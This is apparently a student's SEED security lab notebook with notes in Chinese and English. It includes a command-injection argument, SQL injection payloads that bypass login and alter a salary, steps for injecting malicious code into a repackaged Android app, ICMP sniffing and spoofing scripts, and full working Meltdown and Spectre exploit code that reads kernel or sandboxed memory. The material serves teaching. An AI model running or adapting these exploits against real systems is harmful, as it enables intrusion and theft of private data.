# Information and system security
###### tags: `informationSecurity` `zju` 

## Overview
2. Evironment Variables and Set-UID
3. SQL Injection Attack
4. Android Repacking Attack
5. TicTacToe Malware
6. Packet Sniffing and Spoofing
7. Meltdown Attack
8. Specture Attack

## Lab2 Environment Variables and Set-UID program
講義: http://www.cis.syr.edu/~wedu/seed/Labs_16.04/Software/Environment_Variable_and_SetUID/
### task1 Manipulate Environment Variables
```cmd=
$ printenv PWD
/home/wubinray/Desktop/lab1
$ evn | grep PWD
/home/wubinray/Desktop/lab1
```
### task2 Passing Environment Variables from Parent Process to Child Process
```cmd=
用fork的childe process會繼承parent的環境變數
```
### task3 Environment Variables and execve()
```cmd=
如果是execve("/usr/bin/env", argv, NULL) 没有把环境变数传给新的 program，
那么不会 print 出东西。
如果是execve ("/usr/bin/env", argv, environ)，有把环境变数传给新的 program，
那么环境变数就会被 print 出来。
```
![](https://i.imgur.com/AEcYpCw.png)
### task8 Invoking External Programs Using system() versus execve()
![](https://i.imgur.com/JTPfOuQ.png)
```cmd=
a.out "abc; /bin/rm abc"
```
![](https://i.imgur.com/viIw5Ct.png)


## Lab3 SQL Injection Attack Lab
講義: http://www.cis.syr.edu/~wedu/seed/Labs_16.04/Web/Web_SQL_Injection/
### task1 Get Familiar with SQL Statements
```cmd=
mysql -u root -p
use Users;
show tables;
```
### task2 SQL Injection Attack on SELECT Statement
1. attack from webpage:
    ![](https://i.imgur.com/v5ijlJr.png)
2. attack from command line:
    ![](https://i.imgur.com/0kkcUBx.png)
    ```cmd=
        URL: www.seedlabsqlinjection/unsafe_home.php             username=Alice%27%3b%23
        %27 = `
        %3b = ;
        %23 = #
    ```
3. URL編碼表
    ![](https://i.imgur.com/m7jxpzE.png)
4. URL快速編碼網站
http://www.convertstring.com/zh_TW/EncodeDecode/UrlEncode
### task3 SQL Injection Attack on UPDATE Statement
```cmd=
URL编码: 
 http://www.seedlabsqlinjection.com/unsafe_edit_backend.php?NickName=handsome
 %27%2csalary%3d9999999+where+Name%3d%27Alice%27%3b%23
SQL statement: 
 NickName= handsome ', 9999999 where Name='Alice';#
```

## Lab4 Android Repacking Attack Lab
講義: http://www.cis.syr.edu/~wedu/seed/Labs_16.04/Mobile/Android_Repackaging/
### task1 Obtain A n Android App (APK file) and Install It
```cmd=
adb connect 10.0.2.5
adb install RepackagingLab.apk
```
![](https://i.imgur.com/pipsO3j.png)
### task2 Disassemble Android App
```cmd=
apktool d RepackagingLab.apk
```
![](https://i.imgur.com/rwzQQIm.png)
### task3 Inject Malicious Code
```cmd=
把惡意程式加到app檔案裡面，同時更改app的權限，使app可以看到contact book。
把惡意檔案加入app的system中。
```
![](https://i.imgur.com/JdDFs4g.png)
![](https://i.imgur.com/PALYu4Z.png)
### task4 Repack Android App with Malicious Code
```cmd=
apktool b RepackagingLab [App編譯]
keytool -alias wubinray -genkey -v -keystore mykey.keystore [產生key pair]
jarsigner -keystore mykey.keystore RepackagingLab.apk wubinray [幫app做數位簽章]
```
![](https://i.imgur.com/cG4l39b.png)
![](https://i.imgur.com/eXvNNBe.png)
![](https://i.imgur.com/0d0GuJY.png)
### task5 Install the Repackaged App and Trigger the Malicious Code
```cmd=
adb uninstall RepackagingLab [移除舊的app]
adb connect 10.0.2.5 
adb install RepackagingLab.apk
```
![](https://i.imgur.com/k0XwGya.png)
![](https://i.imgur.com/AMIkx1F.png)
![](https://i.imgur.com/xdk4NVV.png)
![](https://i.imgur.com/TEkStGs.png)
![](https://i.imgur.com/yDz3Xwj.png)
![](https://i.imgur.com/ZYfn8XI.png)

## Lab5 TicTacToe Malware

## Lab6 Packet Sniffing and Spoofing
### task1 Using Tools to Sniff and Spoof Packets
#### 1-1 Sniffing Packets
```python=
from scapy.all import *

def print_pkt(pkt):
    pkt.show()
    
pkt = sniff(filter='icmp',prn=print_pkt,count=5)
```
[sniffer.py 抓取 icmp 封包]
```python=
from scapy.all import *

def print_pkt(pkt):
    pkt.show()
    
pkt = sniff(filter='ip dst 174.37.54.20 and dst port 23',prn=print_pkt,count=5)
```
[sniffer.py 抓取 Tcp封包with特定 IP:174.37.54.20, port=23]
```python=
from scapy.all import *

def print_pkt(pkt):
    pkt.show()
    
pkt = sniff(filter='net 140.113.122.0/32',prn=print_pkt,count=5)
```
[sniffer.py 抓取 封包from subnet 140.113.122.0/32]
#### 1-2 Spoofing ICMP Packets
```python=
from scapy.all import *
a = IP()
a.src = '87.87.87.87'
a.dst = '10.0.2.3'
print(a.show())
b=ICMP()
p = a/b
print(p.show())
send(p)
```
#### 1-3 Trace Route
```python=
import time,threading
from scapy.all import *

def print_pkt(pkt):
    global tmpIp
    #pkt.show()
    tmpIp = str(pkt[0].getlayer(IP).src)
    
def sniffer():
    while True:
        pkt = sniff(filter='icmp and ip dst 10.0.2.15',prn=print_pkt,count=1)

t_sniff = threading.Thread(target=sniffer,args=())
t_sniff = t_sniff.start()

dstIp = '157.185.144.122'
tmpIp = 'x.x.x.x'
TTL = 1
while True:
    a = IP()
    a.dst = dstIp
    a.ttl = TTL
    b = ICMP()
    p = a/b
    
    time.sleep(5)
    send(p, verbose=False)
    print(tmpIp)
    if tmpIp==dstIp:
        print("Trace Terminated !!")
        break
        
    tmpIp = 'x.x.x.x'
    TTL += 1    
```
![](https://i.imgur.com/jSYvHak.png)
(my traceroute code trace 157.185.144.122 which is www.zju.edu.cn ip)
#### 1-4 Sniffing and then Spoofing
```python=
import time
from scapy.all import *

def make_spoofy_pkt(pkt):
    a = IP()
    if str(pkt[0].getlayer(IP).src)=='10.0.2.15' :
        return
    a.dst = pkt[0].getlayer(IP).src
    a.ttl = 87
    b = pkt[0].getlayer(ICMP)
    p = a/b
    
    send(p, verbose=True)
    
while True:
    time.sleep(1)
    pkt = sniff(filter='icmp',prn=make_spoofy_pkt)
```
![](https://i.imgur.com/pil5Gmr.png)
先把網路上的icmp封包抓下來，接著判斷封包的src如果不是從自己發出來的，那麼我們就做spoofy，把封包的dst該城原本的src，就會送回去給原本的發出者，而ICMP的內容則維持不變，因為裏頭有icmp seq的參數。
#### task2 Writing Programs to Sniff and Spoof Packets
```c=
#include <pcap.h>
#include <stdio.h>
/*
This function will be invoked by pcap for each captured packet.
We can process each packet inside the function.
*/
void got_packet(u_char *args,const struct pcap_pkthdr *header,const u_char *packet)
{
	printf("Got a packet\n");
	printf("%s\n",packet);
}
int main()
{
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	char filter_exp[] = "tcp dst port 10-100";
	bpf_u_int32 net;
	
	// Step 1: Open live pcap session on NIC with name eth3
	//         Students needs to change "eth3" to the name
	//         found on their own machines (using ifconfig).
	handle = pcap_open_live("enp0s3", BUFSIZ, 0, 1000, errbuf);

	// Step 2: Compile filter_exp into BPF psuedo-code
	pcap_compile(handle, &fp, filter_exp, 0, net);
	pcap_setfilter(handle, &fp);

	// Step 3: Capture packets
	pcap_loop(handle, -1, got_packet, NULL);

	pcap_close(handle);   //Close the handle
	return 0;
}
// Note: don’t forget to add "-lpcap" to the compilation command.
// For example: gcc -o sniff sniff.c -lpcap
```
#### 2-1A Understanding How a Sniffer Works
![](https://i.imgur.com/LYA42ko.png)
(關閉混和模式)
#### 講解
![](https://i.imgur.com/Rrn9EsI.png)
```cmd=
Device: inp0s3
Snaplen: 單封包的buf長度。
Promisc: 設定網卡模式，混和模式；看到就抓下來，可以抓到別人的封包。
Timeout: 設定抓封包的timeout，比較常設定為1秒鐘。
Errbuff: 如果有錯誤訊息，會送到這裡。
```
![](https://i.imgur.com/IV8tgem.png)
```cmd=
Filter_exp: "ip proto icmp" >> 代表我們只抓icmp封包。
Netmask: 全域。
```
![](https://i.imgur.com/ke8l8fJ.png)
```cmd=
循環執行抓封包。
```
#### 2-1B Writing Filters
![](https://i.imgur.com/usNR0Si.png)
(ICMP封包between 虛擬機 跟 www.baidu.com )
![](https://i.imgur.com/g9xMSVC.png)
(Capture the TCP packets with a destination port number in the range from 10 to 100)

## Lab7 Meltdown Attack
#### task1 Reading from Cache versus from Memory
```c=
// CacheTime.cpp
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdint.h>
#include <bits/stdc++.h>

uint8_t array[10*4096];

int main(int argc, const char **argv)
{
	uint32_t junk=0;
	uint64_t time1,time2;
	uint32_t *addr;
	int i;

	// Initialize the array
	for(i=0; i<10; i++) array[i*4096]=1;

	// Flush the array from the CPU cache
	for(i=0; i<10; i++) _mm_clflush(&array[i*4096]);

	// Access some of the array items 
	array[3*4096] = 100;
	array[7*4096] = 200;

	for(i=0; i<10; i++){
		addr = (uint32_t*)&array[i*4096];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk)-time1;
		printf("Access time for array[%d*4096]: %d CPU cycles\n"
			,i,(int)time2);

	}
	return 0;
}
```
![](https://i.imgur.com/Kq6567R.png)
```
因為array[3*4096]跟array[7*4096]在cache裡頭的關西，所以讀取速度非常快，
大約是從ram讀取的時間的3分之1而已。
```
#### task2 Using Cache as a Side Channel
```c=
// FlushReload.cpp
#include <emmintrin.h>
#include <x86intrin.h>
#include <bits/stdc++.h>
#include <stdint.h>

uint8_t array[256*4096];
int temp;
char secret = 94;

/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
	int i;
	// Write to array to bring it to RAM to prevent Copy-on-write
	for (i = 0; i < 256; i++) 
		array[i*4096 + DELTA] = 1;
	// Flush the values of the array from cache
	for (i = 0; i < 256; i++) 
		_mm_clflush(&array[i*4096 +DELTA]);
}

void victim()
{
	temp = array[secret*4096 + DELTA];
}

void reloadSideChannel()
{
	uint32_t junk=0;
	uint32_t *addr;
	uint64_t time1, time2;

	int i;
	for(i = 0; i < 256; i++){
		addr = (uint32_t*)&array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 <= CACHE_HIT_THRESHOLD){
			printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
			printf("The Secret = %d.\n",i);
		}
	}
}

int main(int argc, const char **argv)
{
	flushSideChannel();
	victim();
	reloadSideChannel();
	return (0);
}
```
![](https://i.imgur.com/OIVUF1W.png)
#### task3 Place Secret Data in Kernel Space
```cmd=
cd MeltdownKernel
make
sudo insmod MeltdownKernel.ko
dmesg | grep `secret data address`
```
![](https://i.imgur.com/AF3sRMJ.png)
#### task4 Access Kernel Memory from User Space
```c=
// AccessMemoryKernel.cpp
#include <bits/stdc++.h>

int main()
{
	char *kernel_data_addr = (char*)0xf9ce3000;
	char kernel_data = *kernel_data_addr;
	printf("I have reached here.\n");
	return 0;
}
```
![](https://i.imgur.com/lCP226V.png)
#### task5 Handle Error/Exceptions in C
```c=
// ExceptionHandling.c
#include <stdio.h>
#include <setjmp.h>
#include <signal.h>

static sigjmp_buf jbuf;

static void catch_segv(int a)
{
  // Roll back to the checkpoint set by sigsetjmp().
  siglongjmp(jbuf, 1);                         
}

int main()
{ 
  // The address of our secret data
  unsigned long kernel_data_addr = 0xfb61b000;

  // Register a signal handler
  signal(SIGSEGV, catch_segv);                     

  if (sigsetjmp(jbuf, 1) == 0) {                
     // A SIGSEGV signal will be raised. 
     char kernel_data = *(char*)kernel_data_addr; 

     // The following statement will not be executed.
     printf("Kernel data at address %lu is: %c\n", 
                    kernel_data_addr, kernel_data);
  }
  else {
     printf("Memory access violation!\n");
  }

  printf("Program continues to execute.\n");
  return 0;
}
```
![](https://i.imgur.com/uBAV4ls.png)
#### task6 Out of Order Execution by CPU
![](https://i.imgur.com/unjEdj9.png)
```c=
// MeltdownExperiment.c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

/*********************** Flush + Reload ************************/
uint8_t array[256*4096];
/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (200)
#define DELTA 1024

void flushSideChannel()
{
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

void reloadSideChannel() 
{
  uint32_t junk=0;
  uint32_t *addr;
  uint64_t time1, time2;
 
  int i;
  for(i = 0; i < 256; i++){
     addr = (uint32_t*)&array[i*4096 + DELTA];
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD){
         printf("array[%d*4096 + %d] is in cache.\n",i,DELTA);
         printf("The Secret = %d.\n",i);
     }
  }	
}
/*********************** Flush + Reload ************************/

void meltdown(unsigned long kernel_data_addr)
{
  char kernel_data = 0;

  // The following statement will cause an exception
  kernel_data = *(char*)kernel_data_addr;     
  array[7 * 4096 + DELTA] += 1;          
}

void meltdown_asm(unsigned long kernel_data_addr)
{
   char kernel_data = 0;
   
   // Give eax register something to do
   asm volatile(
       ".rept 4;"                
       "add $0x141, %%eax;"
       ".endr;"                    
    
       :
       :
       : "eax"
   ); 
    
   // The following statement will cause an exception
   kernel_data = *(char*)kernel_data_addr;  
   array[kernel_data * 4096 + DELTA] += 1;           
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv(int i)
{
  siglongjmp(jbuf, 1);
}

int main()
{
  // Register a signal handler
  signal(SIGSEGV, catch_segv);

  // FLUSH the probing array
  flushSideChannel();

  if (sigsetjmp(jbuf, 1) == 0) {
      //meltdown(0xf9d34000);     
      meltdown_asm(0xf9d34000);           
  }
  else {
      printf("Memory access violation!\n");
  }

  // RELOAD the probing array
  reloadSideChannel();                     
  return 0;
}
```
#### task7 Improve the Attack
![](https://i.imgur.com/V5GpivS.png)
(Improve the Attack by Getting the Secret Data Cached)
![](https://i.imgur.com/baCzLXJ.png)
(Using Assembly Code to Trigger M eltdown)
#### task8 Make the Attack More Practical
```c=
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

/*********************** Flush + Reload ************************/
uint8_t array[256*4096];
/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

static int scores[256];

void reloadSideChannelImproved()
{
  int i;
  volatile uint32_t *addr;
  register uint64_t time1, time2;
  uint32_t junk = 0;
  for (i = 0; i < 256; i++) {
     addr = (uint32_t*)&array[i * 4096 + DELTA];
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD)
        scores[i]++; /* if cache hit, add 1 for this value */
  }
}
/*********************** Flush + Reload ************************/

void meltdown_asm(unsigned long kernel_data_addr)
{
   char kernel_data = 0;
   
   // Give eax register something to do
   asm volatile(
       ".rept 400;"                
       "add $0x141, %%eax;"
       ".endr;"                    
    
       :
       :
       : "eax"
   ); 
    
   // The following statement will cause an exception
   kernel_data = *(char*)kernel_data_addr;  
   array[kernel_data * 4096 + DELTA] += 1;              
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv(int a)
{
   siglongjmp(jbuf, 1);
}

int main()
{
   for (int k=0;k<10;k++){

      int i, j, ret = 0;
  
      // Register signal handler
      signal(SIGSEGV, catch_segv);

      int fd = open("/proc/secret_data", O_RDONLY);
      if (fd < 0) {
         perror("open");
         return -1;
      }
  
      memset(scores, 0, sizeof(scores));
      flushSideChannel();
  
      // Retry 1000 times on the same address.
      for (i = 0; i < 1000; i++) {
         ret = pread(fd, NULL, 0, 0);
         if (ret < 0) {
            perror("pread");
            break;
         }
	
         // Flush the probing array
         for (j = 0; j < 256; j++) 
            _mm_clflush(&array[j * 4096 + DELTA]);

         if (sigsetjmp(jbuf, 1) == 0) { 
             meltdown_asm(0xf9d34000+k); 
         }
         
         reloadSideChannelImproved();
      }

      // Find the index with the highest score.
      int max = 0;
      for (i = 0; i < 256; i++) {
         if (scores[max] < scores[i]) max = i;
      }

      printf("The secret value is %d %c\n", max, max);
      printf("The number of hits is %d\n", scores[max]);
   }
   return 0;
}
```
![](https://i.imgur.com/h91xpsx.png)

## Lab8 Specture Attack
### task1 Read from Cache versus from Memeory (same as Lab7 task1)
### task2 Using Cache as a Side Channel (same as Lab7 task2)
### task3 Out-of-Order Execution and Branch Prediction 
```c=
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

int size = 10;
uint8_t array[256*4096];
uint8_t temp = 0;
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
  uint32_t junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD){
	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);
    }
  } 
}

void victim(size_t x)
{
  if (x < size) {  
      temp = array[x * 4096 + DELTA];  
  }
}

int main() {
  int i;
  // FLUSH the probing array
  flushSideChannel();
  // Train the CPU to take the true branch inside victim()
  for (i = 0; i < 10; i++) {   
   //_mm_clflush(&size); 
   victim(i+20);
  }
  // Exploit the out-of-order execution
  //_mm_clflush(&size);
  for (i = 0; i < 256; i++)
   _mm_clflush(&array[i*4096 + DELTA]); 
  victim(97);  
  // RELOAD the probing array
  reloadSideChannel();
  return (0); 
}
```
成功抓到是在array[97*4096]的地方，因為一開始有訓練cpu讓他執行很多次結果是true的if指令，因為cpu會記憶，有點類似time localitiy的效果，如果這幾次的if判斷都是true，那麼後面幾次cpu會先跳進去if statment是true的位置預先執行，因此在我們執行這次97時，因為cpu預先執行，導致有把array[97*4096]放在cacahe裡面，所以攻擊才會成功的。
### task4 The Specture Attack
```c=
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp = 0;
char *secret = (char*)"Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x < buffer_size) {
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}
int sec_C=0;
void reloadSideChannel()
{
  uint32_t junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD){
	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %c.\n",i);
    }
  } 
}
void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  volatile int z;
  // Train the CPU to take the true branch inside restrictedAccess().
  for (i = 0; i < 10; i++) { 
   _mm_clflush(&buffer_size);
   restrictedAccess(i); 
  }
  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  for (z = 0; z < 100; z++) { }
  // Ask restrictedAccess() to return the secret in out-of-order execution. 
  s = restrictedAccess(larger_x);  
  array[s*4096 + DELTA] += 88;  
}

int main() {
  flushSideChannel();
  size_t larger_x = (size_t)(secret - (char*)buffer);  
  spectreAttack(larger_x+10);
  reloadSideChannel();
  return (0);

}
```
![](https://i.imgur.com/8IzAKBO.png)
### task5 Improve the Attack Accuracy
![](https://i.imgur.com/ydOokbA.png)
![](https://i.imgur.com/pARVJHJ.png)
### task6 Stealing the Entire Secret String
```c=
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp = 0;
char *secret = (char*)"Some Secret Value";
uint8_t b[3*4096];
uint8_t array[257*4096];

#define CACHE_HIT_THRESHOLD (90)
#define DELTA 1024

// Sandbox Function
uint32_t restrictedAccess(size_t x)
{
  if (x < buffer_size) {
     return buffer[x];
  } else {
     return 256;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

static int scores[256];
void reloadSideChannelImproved()
{
int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  uint32_t junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  }
}

void spectreAttack(size_t larger_x)
{
  int i;
  uint32_t s;
  volatile int z;
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Train the CPU to take the true branch inside victim().
  for (i = 0; i < 10; i++) {
    _mm_clflush(&buffer_size);
    for (z = 0; z < 100; z++) { }
    restrictedAccess(i);  
  }
  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Ask victim() to return the secret in out-of-order execution.
  for (z = 0; z < 100; z++) { }
  s = restrictedAccess(larger_x);
  array[s*4096 + DELTA] += 88;
}

int main() {
  for(int j=0;j<11;j++){
    int i;
    uint8_t s;
    size_t larger_x = (size_t)(secret-(char*)buffer)+j;
    flushSideChannel();
    for(i=0;i<256; i++) scores[i]=0; 
    for (i = 0; i < 1000; i++) {
      spectreAttack(larger_x);
      reloadSideChannelImproved();
    }
    int max = 0;
    for (i = 0; i < 256; i++){
     if(scores[max] < scores[i])  
       max = i;
    }
    printf("Reading secret value at %p = ", (void*)larger_x);
    printf("The  secret value is %d : %c\n", max,max);
    printf("The number of hits is %d\n", scores[max]);
  }
  return (0); 
}

```
![](https://i.imgur.com/wVk7rAV.png)
用for迴圈執行11次，每次access的記憶體位置都要+1
